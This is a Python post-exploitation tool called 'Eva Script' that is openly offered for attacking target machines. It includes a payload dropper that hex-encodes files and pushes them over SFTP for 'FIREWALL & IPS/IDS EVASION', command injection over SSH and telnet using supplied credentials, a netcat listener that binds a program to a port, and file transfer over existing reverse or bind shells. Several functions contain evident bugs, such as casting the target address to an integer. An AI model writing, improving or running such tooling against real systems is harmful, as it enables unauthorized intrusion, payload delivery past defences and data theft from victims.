# MADE BY: FANCY
# !/usr/bin/python3

import paramiko
import argparse
import telnetlib
import socket
import subprocess


class Colors(object):
    red = '\033[38;2;255;0;0m\033m'
    green = '\033[0;32m'
    end = '\033[m'
    purple = '\033[0;35m'


parser = argparse.ArgumentParser(usage=f"[ {Colors.green}python3 Eva.py (syntax-here) {Colors.end}]")
parser.add_argument("-lhost", required=False, metavar="lport".upper(), help="local host")
parser.add_argument("-lport", required=False, metavar="lport".upper(), help="local port")
parser.add_argument("--listen", required=False, metavar="lport".upper(),
                    help="listen for incoming connections with netcat")
parser.add_argument("--target", required=False, metavar="ip address".upper(), help="target machine")
parser.add_argument("--exec", required=False, metavar="program".upper(), help="program to exec on target machine")
parser.add_argument("--inject", required=False, metavar="cmd".upper(), help="inject a command into a remote machine")
parser.add_argument("--receive", required=False, metavar="file".upper(), help="download a file from a remote machine")
parser.add_argument("--send", required=False, metavar="file".upper(), help="send a file to the remote machine")
parser.add_argument("-rport", required=False, metavar="rport".upper(), help="remote port")
parser.add_argument("--password", required=False, metavar="password".upper(), help="credentials password")
parser.add_argument("--username", required=False, metavar="password".upper(), help="credentials username")
parser.add_argument("--dropper", required=False, metavar="payload.c".upper(),
                    help="send encoded file via SFTP (FIREWALL & IPS/IDS EVASION)")
argument = parser.parse_args()


class DroppingPayloads(object):
    def __init__(self, payload, target, remote_port, passwd, username, remote_directory):
        self.payload = payload
        self.target = target
        self.remote_port = int(remote_port)
        self.passwd = passwd
        self.username = username
        self.remote_directory = remote_directory

    def file_transfer(self):
        with open(self.payload, "r") as file_to_encode:
            subprocess.call(f"cat {file_to_encode} | xxd > outENC.txt", shell=True)
        print(
            f"[{Colors.green} Encoding Payload And Converting It Into A TXT File And Encoding It With HEX... {Colors.end}]")
        transport = paramiko.Transport(self.target, self.remote_port)
        transport.connect(username=self.username, password=self.passwd)
        sftp = paramiko.SFTPClient.from_transport(transport)
        print(f"[{Colors.green} Transferring {self.payload} To {self.remote_directory}")
        sftp.put("outENC.txt", self.remote_directory)
        print(
            f"[{Colors.green} Good luck... I Heard {self.target} Un-hackable! \nDecode The New Text File And Convert It Back To The Original Format And Have Fun!{Colors.end} ]")
        sftp.close()


class ArgumentInject(object):
    def __init__(self, command, password, username, remote_host, remote_port, local_host, local_port):
        self.command = command
        self.password = password
        self.username = username
        self.remote_host = int(remote_host)
        self.remote_port = int(remote_port)
        self.local_port = int(local_port)
        self.local_host = local_host

    def pre_authenticated_ssh_injection(self):
        try:
            client = paramiko.SSHClient()
            client.load_system_host_keys()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            client.connect(hostname=str(self.remote_host), port=self.remote_port, username=self.username,
                           password=self.password)
            _, ss_stdout, ss_stderr = client.exec_command(self.command)
            r_out, r_err = ss_stdout.readlines(), ss_stderr.read()
            print(r_err)
            if len(r_err) > 5:
                print(r_err)
            else:
                print(r_out)
            client.close()
        except Exception as e:
            exit(e)

    def pre_authenticated_telnet_injection(self):
        tn = telnetlib.Telnet(self.remote_host, port=self.remote_port)
        if tn.read_until(b"login: "):
            tn.write(self.username.encode('ascii') + b"\n")
            tn.write(bytes(f"{self.command}\n"))
            tn.write(b"exit\n")
            print(tn.read_all().decode('ascii'))
        else:
            tn.write(bytes(f"{self.command}\n"))
            tn.write(b"exit\n")
            print(tn.read_all().decode('ascii'))

    def pre_reverse_shell(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.local_host, self.local_port))
        connection, address = sock.accept()
        print("connection from: ".upper() + str(address) + "has been accepted".upper())
        data = connection.recv(1024)
        sock.send(self.command.encode())
        print(data.decode())


class NetCatExtension(object):
    def __init__(self, local_port, program_or_filename):
        self.local_port = local_port
        self.program_or_filename = program_or_filename

    def listening(self):
        subprocess.call(f"nc -lvnp {self.local_port}", shell=True)

    def execute_program(self):
        subprocess.call(f"nc -lvnp {self.local_port} -e {self.program_or_filename}", shell=True)


class DownloadFile(object):
    def __init__(self, local_host, local_port, local_file, remote_host):
        self.local_host = local_host
        self.local_port = local_port
        self.local_file = local_file
        self.remote_host = remote_host

    def download_over_socket(self):
        s = socket.socket()
        s.bind((self.local_host, self.local_port))
        s.listen(5)
        print(f"[{Colors.green}Listening as{Colors.end}]> {self.local_host}:{self.local_port}")
        while True:
            conn, address = s.accept()  # Establish connection with client.
            print(f"[{Colors.green}Connection Received From{Colors.end}]> {address}")
            data = conn.recv(1024)
            print(f"[{Colors.green}Server Received{Colors.end}]> ", repr(data.decode()))

            z_file = open(self.local_file, 'rb')
            file_transfer = z_file.read(1024)
            while file_transfer:
                conn.send(file_transfer)
                print('Sent ', repr(file_transfer))
                file_transfer = z_file.read(1024)
            print(f"[{Colors.red}DONE{Colors.end}]")
            z_file.close()
            conn.close()
            break


class SendFile(object):
    def __init__(self, local_file):
        self.local_file = local_file

    def send_file_over_sockets(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(argument.target)
        print(
            f"<::: [{Colors.green}Connection Received From] ::: [{Colors.green}Sending {self.local_file} Now{Colors.end}] :::>")
        s.sendfile((self.local_file, "/home"))
        s.close()
        print(f"[ {Colors.green}Uploaded To /home{Colors.end} ]")


if __name__ == '__main__':
    print(f"""
{Colors.red}╔═══╗         {Colors.purple}╔═══╗              ╔╗ 
{Colors.red}║╔══╝         {Colors.purple}║╔═╗║             ╔╝╚╗
{Colors.red}║╚══╗╔╗╔╗╔══╗ {Colors.purple}║╚══╗╔══╗╔═╗╔╗╔══╗╚╗╔╝
{Colors.red}║╔══╝║╚╝║╚═╗║ {Colors.purple}╚══╗║║╔═╝║╔╝╠╣║╔╗║ ║║ 
{Colors.red}║╚══╗╚╗╔╝║╚╝╚╗{Colors.purple}║╚═╝║║╚═╗║║ ║║║╚╝║ ║╚╗
{Colors.red}╚═══╝ ╚╝ ╚═══╝{Colors.purple}╚═══╝╚══╝╚╝ ╚╝║╔═╝ ╚═╝
                            {Colors.purple}║║      
                            {Colors.purple}╚╝{Colors.end} --help - display menu\n\n""")
    if argument.send:
        question = input(
            f"[({Colors.red}+++{Colors.end})  Do You Already Have An Outgoing Connection (Current Reverse/Bind Shell) (Y or N){Colors.end}]:# ")
        if question == "y" or question == "Y":
            sending = SendFile(local_file=argument.send)
            sending.send_file_over_sockets()
        else:
            exit(f"[{Colors.red}-{Colors.end}] Please Return Once You Receive A Connection]\n")
    elif argument.dropper:
        dropper = DroppingPayloads(target=argument.target, username=argument.username,
                                   passwd=argument.password, payload=argument.dropper,
                                   remote_directory="/home", remote_port=argument.rport)
        dropper.file_transfer()
    elif argument.receive:
        download = DownloadFile(local_host=argument.lhost, local_port=argument.lhost,
                                local_file=argument.receive, remote_host=argument.target)
        try:
            print(f"[{Colors.green}] NOTE: FOR THIS YOU MUST ALREADY HAVE AN OUTGOING EXISTING CONNECTION")
            download.download_over_socket()
        except Exception as error:
            exit(f"{error}\n")
    elif argument.inject:
        injection = ArgumentInject(local_port=argument.lport, local_host=argument.lhost,
                                   remote_port=argument.rport, remote_host=argument.target,
                                   command=argument.inject, username=argument.username,
                                   password=argument.password)
        question = input(f"[{Colors.green}SSH, TELNET & Over Sockets (ssh, telnet or OS){Colors.end}]:# ")
        if question == "ssh".upper() or question == "ssh".lower():
            injection.pre_authenticated_ssh_injection()
        elif question == "telnet".upper() or question == "telnet".lower():
            injection.pre_authenticated_telnet_injection()
        elif question == "os".upper() or question == "os".lower() or question == "over sockets".upper() or question == "over sockets".lower():
            try:
                injection.pre_reverse_shell()
            except Exception as error:
                print(error,
                      "\n" + f"[{Colors.red}-{Colors.end}]  {error}\n Open A Connection With The Target Machine And Try Again...")
    elif argument.exec:
        netcat_exec = NetCatExtension(local_port="4455", program_or_filename=argument.exec)
        netcat_exec.execute_program()
    elif argument.listen:
        netcat_exec = NetCatExtension(local_port=argument.lport, program_or_filename=argument.exec)
        netcat_exec.listening()
